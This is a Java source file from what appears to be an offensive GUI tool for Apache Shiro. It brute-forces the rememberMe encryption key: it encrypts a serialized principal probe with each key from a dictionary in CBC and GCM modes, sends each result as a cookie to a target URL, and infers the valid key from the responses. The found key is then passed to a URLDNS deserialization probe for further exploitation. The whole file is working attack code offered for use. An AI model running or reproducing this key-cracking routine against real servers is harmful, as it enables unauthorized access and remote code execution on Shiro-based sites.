package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Log;
import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.object.KeyInfoObj;
import com.y5neko.shiroexp.object.ResponseOBJ;
import com.y5neko.shiroexp.object.TargetOBJ;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.ui.tabpane.Shiro550Tab;
import com.y5neko.shiroexp.ui.tabpane.URLDNSTab;
import javafx.application.Platform;
import javafx.scene.control.TextArea;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class BruteKey {
    /**
     * 追加日志并自动滚动到底部的辅助方法
     * @param logTextArea 日志文本框
     * @param text 要追加的文本
     */
    private static void appendLogWithScroll(TextArea logTextArea, String text) {
        logTextArea.appendText(text);
        logTextArea.setScrollTop(Double.MAX_VALUE);
    }

    /**
     * @param url 目标地址
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        return bruteKey(url, "rememberMe", globalComponents);
    }

    /**
     * @param url 目标地址
     * @param cryptType 加密模式（"爆破所有"、"CBC" 或 "GCM"）
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, Shiro550Tab.GlobalComponents globalComponents, String cryptType) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        return bruteKey(url, "rememberMe", globalComponents, cryptType);
    }

    /**
     * key爆破模块
     * @param url 目标地址
     * @param rememberMeString 自定义rememberMe字段名
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString, Shiro550Tab.GlobalComponents globalComponents) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        // 默认使用"爆破所有"模式
        return bruteKey(url, rememberMeString, globalComponents, "爆破所有");
    }

    /**
     * key爆破模块
     * @param url 目标地址
     * @param rememberMeString 自定义rememberMe字段名
     * @param cryptType 加密模式（"爆破所有"、"CBC" 或 "GCM"）
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString, Shiro550Tab.GlobalComponents globalComponents, String cryptType) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String key;
        String checkData = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
        String[] keys = Tools.multiLoadFile("./misc/keys.txt");
        KeyInfoObj keyInfoObj = new KeyInfoObj();

        // 判断爆破模式
        boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
        boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);

        boolean checkFlag = false;

        // 遍历key字典进行爆破
        for (String s : keys) {

            // 检查是否需要停止
            if (globalComponents.stopFlag) {
                Platform.runLater(() -> {
                    appendLogWithScroll(globalComponents.logArea, "[INFO]检测已停止\n");
                });
                return keyInfoObj;
            }

            // 延迟100ms，防止UI线程冲突
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                // 线程被中断，退出爆破
                Platform.runLater(() -> {
                    appendLogWithScroll(globalComponents.logArea, "[INFO]检测已停止\n");
                });
                return keyInfoObj;
            }

            // 根据加密模式生成对应的 payload
            String payload_cbc = null;
            String payload_gcm = null;

            if (tryCBC) {
                payload_cbc = rememberMeString + "=" + Tools.CBC_Encrypt(s, checkData);
            }
            if (tryGCM) {
                payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(s, checkData);
            }

            // 构造请求进行对比
            Map<String, String> headers_123 = new HashMap<>();
            headers_123.put("Cookie", rememberMeString + "=" + "123");
            ResponseOBJ response_123 = HttpRequest.httpRequest(url, null, headers_123, "GET");

            Map<String, String> headers_cbc = null;
            ResponseOBJ response_cbc = null;

            if (tryCBC && payload_cbc != null) {
                headers_cbc = new HashMap<>();
                headers_cbc.put("Cookie", payload_cbc);
                response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");
            }

            Map<String, String> headers_gcm = null;
            ResponseOBJ response_gcm = null;

            if (tryGCM && payload_gcm != null) {
                headers_gcm = new HashMap<>();
                headers_gcm.put("Cookie", payload_gcm);
                response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");
            }

            // 先判断是否存在shiro框架
            if (Objects.requireNonNull(response_123.getHeaders().get("Set-Cookie")).contains(rememberMeString) && !checkFlag) {
                System.out.println(Log.buffer_logging("INFO", "存在shiro框架"));
                if (globalComponents.logArea!= null) {
                    Platform.runLater(() -> {
                        appendLogWithScroll(globalComponents.logArea, "[INFO]存在shiro框架\n");
                    });
                    checkFlag = true;
                }
            } else if (!Objects.requireNonNull(response_123.getHeaders().get("Set-Cookie")).contains(rememberMeString) && !checkFlag){
                System.out.println(Log.buffer_logging("INFO", "不存在shiro框架"));
                if (globalComponents.logArea!= null) {
                    Platform.runLater(() -> {
                        appendLogWithScroll(globalComponents.logArea, "[INFO]不存在shiro框架\n");
                    });
                }
                return keyInfoObj;
            }

            // 控制台打印
            System.out.println(Log.buffer_logging("INFO", "正在尝试key: " + s));
            // UI打印
            if (globalComponents.logArea != null) {
                Platform.runLater(() -> {
                    appendLogWithScroll(globalComponents.logArea, "[INFO]正在尝试key: " + s + "\n");
                });
            }

            // 判断响应
            // shiro在密钥错误时会返回400状态码，并且响应体中会包含deleteMe特征
            if (response_cbc != null || response_gcm != null) {
                int length_123 = response_123.getHeaders().size();

                // 检查 CBC 模式
                if (tryCBC && response_cbc != null) {
                    int length_cbc = response_cbc.getHeaders().size();
                    if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
                        key = s;
                        keyInfoObj.setKey(key);
                        keyInfoObj.setType("CBC");
                        break;
                    }
                }

                // 检查 GCM 模式
                if (tryGCM && response_gcm != null) {
                    int length_gcm = response_gcm.getHeaders().size();
                    if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
                        key = s;
                        keyInfoObj.setKey(key);
                        keyInfoObj.setType("GCM");
                        break;
                    }
                }
            }
        }

        // 处理前端显示
        if (globalComponents.logArea != null) {
            Platform.runLater(() -> {
                appendLogWithScroll(globalComponents.logArea, "[SUCC]发现key: " + keyInfoObj.getKey() + "，类型为：" + keyInfoObj.getType() + "\n");
                globalComponents.rememberMeField.setText(keyInfoObj.getKey());
                globalComponents.cryptTypeComboBox.getSelectionModel().select(keyInfoObj.getType());

                // 自动同步到 FindClassByURLDNS 标签页
                appendLogWithScroll(globalComponents.logArea, "========================================\n");
                appendLogWithScroll(globalComponents.logArea, "[提示] 配置已自动同步到「FindClassByURLDNS」标签页\n");
                appendLogWithScroll(globalComponents.logArea, "========================================\n\n");
            });
        }

        // 调用 URLDNS 探测标签页的更新方法（包含加密模式和请求方式）
        String requestType = globalComponents.requestTypeComboBox != null ? globalComponents.requestTypeComboBox.getValue() : "GET";
        URLDNSTab.updateFromShiro550Static(url.getUrl(), keyInfoObj.getKey(), rememberMeString, keyInfoObj.getType(), requestType);

        return keyInfoObj;
    }

    public static void main(String[] args) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
//        KeyInfoObj key = bruteKey(new TargetOBJ("http://127.0.0.1:8080/login"), logTextArea);
//        System.out.println(key);
    }
}

